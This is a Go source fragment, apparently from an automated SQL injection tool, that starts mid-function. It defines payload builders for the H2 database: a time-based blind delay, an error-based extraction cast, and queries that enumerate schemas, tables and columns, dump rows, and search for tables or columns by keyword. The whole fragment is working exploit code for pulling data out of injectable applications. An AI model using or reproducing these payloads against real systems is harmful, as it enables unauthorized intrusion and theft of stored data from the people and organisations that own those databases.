			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT COUNT(*) FROM SYSTEM_RANGE(1,%d)) ELSE 1 END", cond, 100000000*n/2)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT)", expr), true
		},
		Databases: func() string {
			return "(SELECT LISTAGG(SCHEMA_NAME,CHAR(30)) WITHIN GROUP (ORDER BY SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA)"
		},
		Schemas: func(db string) string { return "" },
		Tables: func(db, schema string) string {
			sch := strings.TrimSpace(schema)
			if sch == "" {
				sch = strings.TrimSpace(db)
			}
			if sch == "" {
				sch = "PUBLIC"
			}
			return fmt.Sprintf("(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=%s)", literal(strings.ToUpper(sch)))
		},
		Columns: func(db, schema, table string) string {
			sch := strings.TrimSpace(schema)
			if sch == "" {
				sch = strings.TrimSpace(db)
			}
			if sch == "" {
				sch = "PUBLIC"
			}
			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(sch)), literal(strings.ToUpper(table)))
		},
		CurrentDB:  func() string { return "DATABASE()" },
		Version:    func() string { return "H2VERSION()" },
		User:       func() string { return "CURRENT_USER" },
		Hostname:   func() string { return "'localhost'" },
		IsDBA:      func() string { return "1" },
		Privileges: func() string { return "''" },
		Users:      func() string { return "''" },
		Passwords:  func() string { return "''" },
		Roles:      func() string { return "''" },
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", h2Table(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR),'NULL')", quoteDouble(strings.ToUpper(c))))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "CHAR(31)", false), h2Table(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) { return "", false },
		OSCmd:    func(cmd string) (string, bool) { return "", false },
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			sch := strings.TrimSpace(schema)
			if sch == "" {
				sch = strings.TrimSpace(db)
			}
			if sch == "" {
				sch = "PUBLIC"
			}
			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME||':'||DATA_TYPE,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(sch)), literal(strings.ToUpper(table)))
		},
		AllTables: func() string {
			return "(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES)"
		},
		AllColumns: func() string {
			return "(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS)"
		},
	}
}
